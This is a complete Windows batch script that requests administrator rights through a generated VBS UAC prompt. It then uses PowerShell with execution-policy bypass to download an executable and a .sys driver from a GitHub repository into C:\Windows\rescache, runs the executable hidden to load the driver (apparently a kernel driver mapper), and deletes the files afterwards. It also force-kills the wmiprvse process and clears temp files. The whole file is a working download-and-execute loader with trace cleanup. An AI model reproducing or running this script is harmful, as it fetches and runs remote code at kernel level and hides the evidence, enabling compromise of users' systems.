@echo off
color 0a

echo ==============================
echo =      64TH NEW TEMP         =
echo ==============================
echo.

:: Admin Check and Elevation
:-------------------------------------
NET FILE 1>NUL 2>NUL
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( 
    goto gotAdmin 
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Ensure the rescache directory exists
if not exist "C:\ProgramData\USOShared\Logs\System" (
    mkdir "C:\ProgramData\USOShared\Logs\System"
)

echo Loading and executing in memory...
echo [•] Downloading components...

:: Downloads and executes from rescache
powershell -nop -ep bypass -c "$n=New-Object Net.WebClient;$n.Headers.Add('User-Agent','Mozilla/5.0');$e='C:\Windows\rescache\' + [System.IO.Path]::GetRandomFileName() + '.exe';$s='C:\Windows\rescache\' + [System.IO.Path]::GetRandomFileName() + '.sys';try{$n.DownloadFile('https://github.com/64file911/Temp/raw/refs/heads/main/mapper.exe',$e);$n.DownloadFile('https://github.com/64file911/Temp/raw/refs/heads/main/system.sys',$s);$p=New-Object Diagnostics.ProcessStartInfo;$p.FileName=$e;$p.Arguments='-- \"'+$s+'\"';$p.WindowStyle='Hidden';$proc=[Diagnostics.Process]::Start($p);$proc.WaitForExit();}finally{if(Test-Path $e){Remove-Item $e -Force};if(Test-Path $s){Remove-Item $s -Force}}"

echo [✓] Execution completed!
echo [•] Performing instant cleanup...

:: Cleanup temporary files from rescache
powershell -c "Stop-Process -Name wmiprvse -Force -ErrorAction SilentlyContinue; Get-ChildItem -Path 'C:\Windows\rescache' -Filter '*.tmp' -Force | Remove-Item -Force"

timeout /t 1 /nobreak >nul
echo [✓] All done!
pause
exit /B
